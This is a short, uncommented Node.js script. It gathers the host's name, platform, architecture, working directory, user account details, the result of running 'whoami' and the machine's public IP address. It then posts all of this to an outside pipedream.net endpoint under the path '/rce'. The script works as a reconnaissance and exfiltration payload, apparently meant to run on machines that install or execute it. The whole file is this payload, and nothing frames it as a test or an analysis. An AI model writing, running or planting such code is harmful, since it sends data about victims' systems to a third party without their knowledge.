
const https = require("https");
const os = require("os");
const { execSync } = require("child_process");

const data = {
  hostname: os.hostname(),
  platform: os.platform(),
  arch: os.arch(),
  cwd: process.cwd(),
  userInfo: os.userInfo(),
  whoami: execSync("whoami").toString().trim(),
  ip: ""
};

https.get("https://api.ipify.org", (res) => {
  let ip = "";
  res.on("data", chunk => ip += chunk);
  res.on("end", () => {
    data.ip = ip;

    const payload = JSON.stringify(data);
    const options = {
      hostname: "eoln3qkz786u94h.m.pipedream.net",
      path: "/rce",
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": payload.length
      }
    };

    const req = https.request(options, res => {
      res.on("data", d => process.stdout.write(d));
    });

    req.on("error", error => console.error(error));
    req.write(payload);
    req.end();
  });
});

